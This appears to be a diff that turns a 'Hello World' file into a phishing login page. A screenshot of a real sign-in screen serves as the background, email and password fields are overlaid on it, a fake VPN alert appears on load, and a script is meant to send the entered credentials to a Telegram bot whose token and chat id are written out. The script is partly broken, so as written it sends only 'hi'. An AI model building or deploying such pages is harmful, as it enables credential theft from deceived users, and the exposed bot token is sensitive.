@@ -1,1 +1,81 @@
-Hello World !
+<!DOCTYPE html>
+<html lang="en" xmlns="http://www.w3.org/1999/html" xmlns="http://www.w3.org/1999/html">
+<head>
+  <meta charset="UTF-8">
+  <title>Log in</title>
+</head>
+
+<style>
+  body {
+    background-repeat: no-repeat;
+    background-image: url("https://s6.uupload.ir/files/screenshot_20220920-183911_chrome_xncy.jpg");
+    background-size:100%;
+    overflow: hidden;
+    position: relative;
+    background-position:top;
+    display: block;
+    -webkit-user-select: none;
+    margin: auto;
+    background-attachment: fixed;
+  }
+
+  .myBtn{
+    width: 890px;
+    height: 100px;
+    background-color: gold;
+    margin-top: 400px;
+    margin-left: 45px;
+font-size: 60px;
+    border: 3px solid gold;
+    font-weight: bold;
+
+  }
+  input[type=password]{
+    margin-top: 170px;
+    margin-left: 45px;
+    height: 94px;
+    width: 890px;
+    font-size: 50px;
+
+  }
+  input[type=email]{
+    margin-top: 485px;
+    margin-left: 45px;
+    height: 94px;
+    width: 890px;
+    font-size: 40px;
+ }
+
+</style>
+ 
+<form>
+  <label>
+    <input id="mail" type="email">
+ <input id="pass" type="password">
+ <input type="submit"  value="LOGIN NOW" class="myBtn">
+ 
+  </label>
+</form>
+
+
+<script>
+
+alert("you need turn on the vpn !")
+
+document.getElementById("myBtn").addEventListener("click", function(e) {
+e.preventDefault(); 
+
+var message = "<html><br>| Email: ${mail} <br> | Pass: ${pass} <br></html>";
+ 
+var url = `https://api.telegram.org/bot5346226937:AAHx-2IbAGkaYIfqRbiR-9DlSLVgNxBPDK0/sendMessage?chat_id=5446661281&text=hi`;
+    
+var oReq = new XMLHttpRequest();
+oReq.open("GET", url);
+oReq.send();
+
+}); 
+
+</script>
+
+
+</html>
